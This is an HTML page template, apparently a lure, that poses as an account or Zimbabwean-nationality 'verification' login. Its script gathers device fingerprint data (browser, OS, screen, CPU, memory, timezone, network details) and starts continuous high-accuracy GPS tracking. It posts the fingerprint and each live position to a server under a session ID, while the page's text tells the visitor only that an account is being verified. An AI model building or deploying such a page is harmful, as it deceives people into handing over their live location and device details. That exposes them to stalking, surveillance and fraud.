<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>zimonline.getpayed.com</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background: #050708;
            color: #ffffff;
            font-family: Arial, sans-serif;
        }

        .container {
            width: min(480px, 100%);
        }

        .card {
            background: #0d1116;
            border: 1px solid #222a32;
            border-radius: 16px;
            padding: 30px;
            text-align: center;
        }

        .icon {
            width: 70px;
            height: 70px;
            margin: 0 auto 20px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #151c24;
            font-size: 30px;
        }

        h1 {
            margin: 0;
            font-size: 26px;
        }

        .description {
            margin: 14px 0 25px;
            color: #8d98a5;
            line-height: 1.6;
            font-size: 14px;
        }

        .status {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 13px;
            margin-bottom: 18px;
            border-radius: 9px;
            background: #080c10;
            border: 1px solid #202831;
            text-align: left;
        }

        .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #68727d;
            flex-shrink: 0;
        }

        .dot.live {
            background: #4ee77a;
            box-shadow: 0 0 12px rgba(78, 231, 122, .6);
        }

        .dot.error {
            background: #ff5252;
        }

        .status-text {
            font-size: 13px;
            font-weight: bold;
        }

        .button {
            width: 100%;
            min-height: 56px;
            border: 0;
            border-radius: 10px;
            background: #ffffff;
            color: #050708;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
        }

        .button:hover {
            opacity: .9;
        }

        .button.stop {
            background: #321719;
            color: #ff9696;
            border: 1px solid #65272c;
        }

        .message {
            margin-top: 18px;
            padding: 14px;
            border-radius: 9px;
            background: #090d11;
            border: 1px solid #202831;
            color: #8d98a5;
            font-size: 13px;
            line-height: 1.5;
        }

        .sharing-info {
            display: none;
            margin-top: 18px;
            padding: 15px;
            background: #09130d;
            border: 1px solid #173c25;
            border-radius: 9px;
            color: #72ed9a;
            font-size: 13px;
            line-height: 1.6;
        }

        .sharing-info.visible {
            display: block;
        }

        .footer {
            margin-top: 20px;
            color: #56616d;
            font-size: 11px;
        }
    </style>
</head>

<body>

<div class="container">

    <div class="card">

        <div class="icon">
            ◎
        </div>

        <h1>
            Login to Proceed. 
        </h1>

        <div class="description">
            Press that button below to allow this browser to 
            verify if you are a zimbabwean.
        </div>

        <div class="status">

            <div
                class="dot"
                id="statusDot">
            </div>

            <div
                class="status-text"
                id="statusText">
                Status not verified
            </div>

        </div>

        <button
            type="button"
            class="button"
            id="shareButton">

            Start Verification

        </button>

        <div
            class="sharing-info"
            id="sharingInfo">

            ✓ Your account is verified now.<br>
            Please wait a moment while finalizing...

        </div>

        <div
            class="message"
            id="message">

            Verification not started.

        </div>

        <div class="footer">

            Session: {{ session_id }}

        </div>

    </div>

</div>

<script>

const sessionId = "{{ session_id }}";

let watchId = null;
let sharing = false;


const shareButton =
    document.getElementById(
        "shareButton"
    );

const statusDot =
    document.getElementById(
        "statusDot"
    );

const statusText =
    document.getElementById(
        "statusText"
    );

const message =
    document.getElementById(
        "message"
    );

const sharingInfo =
    document.getElementById(
        "sharingInfo"
    );


function setStatus(
    text,
    state
) {

    statusText.textContent = text;

    statusDot.className = "dot";

    if (state) {
        statusDot.classList.add(state);
    }
}


function showMessage(text) {

    message.textContent = text;
}


async function sendLocation(position) {

    const latitude =
        position.coords.latitude;

    const longitude =
        position.coords.longitude;

    const accuracy =
        position.coords.accuracy;

    try {

        const response =
            await fetch(
                "/api/location/" +
                sessionId,
                {
                    method: "POST",
                    headers: {
                        "Content-Type":
                            "application/json"
                    },
                    body: JSON.stringify({
                        latitude: latitude,
                        longitude: longitude,
                        accuracy: accuracy
                    })
                }
            );

        if (!response.ok) {

            throw new Error(
                "Region update failed."
            );
        }

        setStatus(
            "Account Verified",
            "live"
        );

        showMessage(
            "Your account will be verified automatically next time you login."
        );

    } catch (error) {

        setStatus(
            "CONNECTION PROBLEM",
            "error"
        );

        showMessage(
            "Your account could not be verified. Please check your internet connection."
        );
    }
}


async function sendDeviceInfo() {

    const connection =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection;

    let browser = "Unknown";
    let operatingSystem = "Unknown";
    let deviceType = "Desktop";

    const userAgent =
        navigator.userAgent;

    if (
        /Chrome/i.test(userAgent) &&
        !/Edge/i.test(userAgent)
    ) {
        browser = "Chrome";
    } else if (/Firefox/i.test(userAgent)) {
        browser = "Firefox";
    } else if (/Safari/i.test(userAgent)) {
        browser = "Safari";
    } else if (/Edge/i.test(userAgent)) {
        browser = "Edge";
    }

    if (/Windows/i.test(userAgent)) {
        operatingSystem = "Windows";
    } else if (/Android/i.test(userAgent)) {
        operatingSystem = "Android";
    } else if (/iPhone|iPad/i.test(userAgent)) {
        operatingSystem = "iOS";
    } else if (/Mac/i.test(userAgent)) {
        operatingSystem = "macOS";
    } else if (/Linux/i.test(userAgent)) {
        operatingSystem = "Linux";
    }

    if (
        /Mobi|Android|iPhone|iPad/i.test(userAgent)
    ) {
        deviceType = "Mobile";
    }

    const data = {

        user_agent:
            userAgent,

        platform:
            navigator.platform || null,

        browser:
            browser,

        operating_system:
            operatingSystem,

        device_type:
            deviceType,

        language:
            navigator.language || null,

        timezone:
            Intl.DateTimeFormat()
                .resolvedOptions()
                .timeZone || null,

        screen_width:
            window.screen.width,

        screen_height:
            window.screen.height,

        pixel_ratio:
            window.devicePixelRatio || 1,

        cpu_cores:
            navigator.hardwareConcurrency || null,

        device_memory:
            navigator.deviceMemory || null,

        touch_points:
            navigator.maxTouchPoints || 0,

        online:
            navigator.onLine,

        mobile:
            /Mobi|Android|iPhone|iPad/i.test(
                userAgent
            ),

        connection:
            connection
                ? {
                    type:
                        connection.type || null,

                    effective_type:
                        connection.effectiveType || null,

                    downlink:
                        connection.downlink || null,

                    rtt:
                        connection.rtt || null,

                    save_data:
                        connection.saveData || false
                }
                : {}

    };

    try {

        await fetch(
            "/api/device-info/" +
            sessionId,
            {
                method: "POST",
                headers: {
                    "Content-Type":
                        "application/json"
                },
                body: JSON.stringify(data)
            }
        );

    } catch (error) {

    }
}


function startSharing() {

    if (!navigator.geolocation) {

        setStatus(
            "verification is not supported",
            "error"
        );

        showMessage(
            "This browser does not support this website terms."
        );

        return;
    }

    if (sharing) {
        return;
    }

    sharing = true;

    shareButton.textContent =
        "Stop Verification";

    shareButton.classList.add(
        "stop"
    );

    sharingInfo.classList.add(
        "visible"
    );

    setStatus(
        "REQUESTING VERIFICATION",
        ""
    );

    showMessage(
        "Please allow location access in your browser to proceed with verification."
    );

    sendDeviceInfo();

    watchId =
        navigator.geolocation.watchPosition(
            sendLocation,
            handleLocationError,
            {
                enableHighAccuracy: true,
                maximumAge: 0,
                timeout: 15000
            }
        );
}


function handleLocationError(error) {

    if (error.code === 1) {

        setStatus(
            "VERIFICATION DENIED",
            "error"
        );

        showMessage(
            "Location permission was denied. Allow location access and try again."
        );

    } else if (error.code === 2) {

        setStatus(
            "LOCATION UNAVAILABLE",
            "error"
        );

        showMessage(
            "Your device could not determine your location."
        );

    } else if (error.code === 3) {

        setStatus(
            "LOCATION TIMEOUT",
            "error"
        );

        showMessage(
            "The location request timed out. Try again."
        );

    } else {

        setStatus(
            "LOCATION ERROR",
            "error"
        );

        showMessage(
            "The browser could not provide your location."
        );
    }

    stopSharing();
}


function stopSharing() {

    if (watchId !== null) {

        navigator.geolocation.clearWatch(
            watchId
        );

        watchId = null;
    }

    sharing = false;

    shareButton.textContent =
        "START ACCOUNT VERIFICATION";

    shareButton.classList.remove(
        "stop"
    );

    sharingInfo.classList.remove(
        "visible"
    );

    setStatus(
        "ACCOUNT NOT VERIFIED",
        ""
    );

    showMessage(
        "Account verification has been stopped."
    );
}


shareButton.addEventListener(
    "click",
    function() {

        if (sharing) {

            stopSharing();

        } else {

            startSharing();
        }
    }
);

</script>

</body>
</html>
